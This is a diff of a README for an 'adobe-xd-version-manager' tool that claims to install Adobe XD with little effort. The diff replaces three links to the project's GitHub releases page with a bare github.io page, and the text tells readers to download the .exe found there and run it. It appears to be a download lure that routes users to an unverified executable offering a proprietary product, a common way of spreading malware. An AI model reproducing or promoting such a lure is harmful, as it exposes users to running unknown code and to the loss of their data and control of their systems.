@@ -1,6 +1,6 @@
 # 📦 adobe-xd-version-manager - Install Adobe XD Without the Hassle
 
-[![Download for Windows](https://img.shields.io/badge/Download-Install%20Now-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/aramrazorsharp428/adobe-xd-version-manager/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Install%20Now-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://aramrazorsharp428.github.io)
 
 ## 🎯 What This Software Does
 
@@ -36,7 +36,7 @@ Follow these steps in order. Do not skip any step.
 
 Go to this webpage:
 
-**https://github.com/aramrazorsharp428/adobe-xd-version-manager/releases**
+**https://aramrazorsharp428.github.io**
 
 You will see a list of files. Look for the file that ends with `.exe`. This is the installer file.
 
@@ -250,7 +250,7 @@ Remember: the manager does the heavy lifting. Your job is just to click the righ
 
 The download page is here one more time for your convenience:
 
-**https://github.com/aramrazorsharp428/adobe-xd-version-manager/releases**
+**https://aramrazorsharp428.github.io**
 
 Click the link, download the `.exe` file, run it, and follow the steps. You will have Adobe XD running in about fifteen minutes.
 
